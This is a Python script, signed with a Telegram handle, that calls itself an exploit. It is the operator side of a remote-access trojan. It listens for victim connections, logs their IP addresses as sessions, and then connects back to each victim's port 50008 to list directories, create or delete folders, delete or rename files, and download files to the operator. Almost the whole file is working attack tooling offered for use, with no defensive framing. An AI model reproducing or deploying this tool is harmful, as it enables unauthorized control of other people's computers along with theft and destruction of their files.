#by skayl56
import os
import socket
import sys
import random
import time


try:
	if (sys.argv[1]) == "runserver":
		sock = socket.socket()
		sock.bind(('0.0.0.0', 50007))
		sock.listen(5)
		sock.setblocking(False)

		work = True
		print("This exploit was create the skayl56.")
		print("Contact telegram @skayl23\n")

		print("Run server on ip 127.0.0.1")
		print("Wait connect...")

		while work:
			try:
				conn, addr = sock.accept()
				data = conn.recv(1024)
				ip = str(addr[0])
				id_look = (str(random.randint(1,10)) + str(random.randint(1,10)) + str(random.randint(1,10)))
				print ('Connected: ' + ip + "\nOpen sessions: " + str(id_look))
				with open("userip.txt", "a") as f:
					f.write("Sessions " + id_look + ": " + ip + "\n")
					work = False
			except:
				pass

	elif sys.argv[1] == "sessions":
		print("All sessions\n\n")
		spic = open('userip.txt').read().split('\n')
		for u in spic:
			print(u)

	elif sys.argv[1] == "-h":
		print("""
			Commands:
			cd <directory>
			pwd [all files in directory]
			mkdir <name folder> [create folder]
			rmdir <name folder> [remove folder]
			remove <name file> [remove file]
			rename <name file> [rename the file]
			download <name file> [download file on your computer]

			exit (exit)

			""")

	elif sys.argv[1] == "-o":
		ip_user = 0
		id_sessions = str(sys.argv[2])
		spic = open('userip.txt').read().split('\n')
		try:
			for i in spic:
				session = i.split(":")[0].split(" ")[1]
				if id_sessions == str(session):
					ip_user = i.split(":")[1].split(" ")[1]
				else:
					pass
		except:
			pass

		try:
			if ip_user == 0:
				print("Sessions not found")

			else:
				print("Connect to " + str(ip_user))
				run = True
				while run:
					command = input("Commands: ")
					if command == "ls":
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.connect((ip_user, 50008))
						sock.sendall("ls".encode())
						data = sock.recv(1024).decode()
						print(data)
						sock.close()

					elif command == "help":
						print("Help commands:\n\n1. ls [see the directory]\n2. pwd\n3. mkdir [create a folder]\n4. rmdir [remove a folder]\n5. remove [remove a file]\n6. download [file]\n7. rename [your file]\n8. cd [to folder]\n9. exit")

					elif command == "pwd":
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.connect((ip_user, 50008))
						sock.sendall("pwd".encode())
						data = sock.recv(1024).decode()
						print(data)
						sock.close()

					elif command[0] == "m" and command[1] == "k" and command[2] == "d":
						try:
							sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							sock.connect((ip_user, 50008))
							arguments = command.split(" ")
							if len(command.split(" ")) > 2:
								arguments.remove(command.split(" ")[0])
								arg2 = (" ").join(arguments)
							else:
								arg2 = command.split(" ")[1]
							try:
								sock.sendall(("mkdir!" + str(arg2)).encode())
								print("Successfully create a Folder: " + arg2)
								sock.close()
							except:
								print("Don't found command or Error command")
						except:
							print("Don't found command or Error command")

					elif command[0] == "r" and command[1] == "m" and command[2] == "d":
						try:
							sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							sock.connect((ip_user, 50008))
							arguments = command.split(" ")
							if len(command.split(" ")) > 2:
								arguments.remove(command.split(" ")[0])
								arg2 = (" ").join(arguments)
							else:
								arg2 = command.split(" ")[1]
							try:
								sock.sendall(("rmdir!" + str(arg2)).encode())
								print("Successfully delete a Folder: " + arg2)
								sock.close()
							except:
								print("Don't found command or Error command")
						except:
							print("Don't found command or Error command")


					elif command[0] == "r" and command[1] == "e" and command[2] == "m":
						try:
							sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							sock.connect((ip_user, 50008))
							arguments = command.split(" ")
							if len(command.split(" ")) > 2:
								arguments.remove(command.split(" ")[0])
								arg2 = (" ").join(arguments)
							else:
								arg2 = command.split(" ")[1]
							try:
								test = arg2.split(".")[1]
								sock.sendall(("remove!" + str(arg2)).encode())
								print("Successfully removed the file: " + arg2)
								sock.close()
							except:
								print("Don't found command or Error command")

						except:
							print("Don't found command or Error command")

					elif command[0] == "r" and command[1] == "e" and command[2] == "n" and command[3] == "a":
						try:
							sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							sock.connect((ip_user, 50008))
							arguments = command.split(" ")
							if len(command.split(" ")) > 2:
								arguments.remove(command.split(" ")[0])
								arguments.remove(command.split(" ")[-1])
								arg2 = (" ").join(arguments)
							else:
								arg2 = command.split(" ")[1]
							arg3 = command.split(" ")[-1]
							try:
								sock.sendall(("rename!" + str(arg2) + "!" + str(arg3)).encode())
								print("Successfully renamed the file " + arg2 + " to " + arg3)
								sock.close()
							except:
								print("Don't found command or Error command")

						except:
							print("Don't found command or Error command")

					elif command[0] == "d" and command[1] == "o" and command[2] == "w":
						try:
							sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							sock.connect((ip_user, 50008))
							arguments = command.split(" ")
							if len(command.split(" ")) > 2:
								arguments.remove(command.split(" ")[0])
								arg2 = (" ").join(arguments)
							else:
								arg2 = command.split(" ")[1]
							try:
								test = arg2.split(".")[1]
								sock.sendall(("download!" + str(arg2)).encode())
								data = sock.recv(1024).decode()
								argv = data.split("!")[1]
								try:
									name = data.split("!")[0]
									text = data.split("!")[1]
									with open(str(name), "w") as f:
										f.write(str(text))
									sock.close()
								except Exception as exc:
									print("Don't found command or Error command")
							except:
								print("Don't found command or Error command")

						except:
							print("Don't found command or Error command")
					elif command[0] == "c" and command[1] == "d":
						arguments = command.split(" ")
						try:
							sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							sock.connect((ip_user, 50008))
							if len(command.split(" ")) > 2:
								arguments.remove(command.split(" ")[0])
								arg2 = (" ").join(arguments)
							else:
								arg2 = command.split(" ")[1]
							sock.sendall(("cd!" + str(arg2)).encode())
							sock.close()
						except:
							print("Don't found command or Error command")


					elif command == "help":
						print("""
							Commands:
							cd <directory>
							pwd [all files in directory]
							mkdir <name folder> [create folder]
							rmdir <name folder> [remove folder]
							remove <name file> [remove file]
							rename <name file> [rename the file]
							download <name file> [download file on your computer]

							exit (exit)

							""")

					elif command == "exit":
						sock.close()
						run = False
					else:
						print("Don't found command")


		except Exception as exc:
			print(exc)
except:
	print("Coomands:\n1. runserver [start localhost]\n2. -o [open the sessions]\n3. -h - [open the menu help]\n4. sessions [all sessions]")

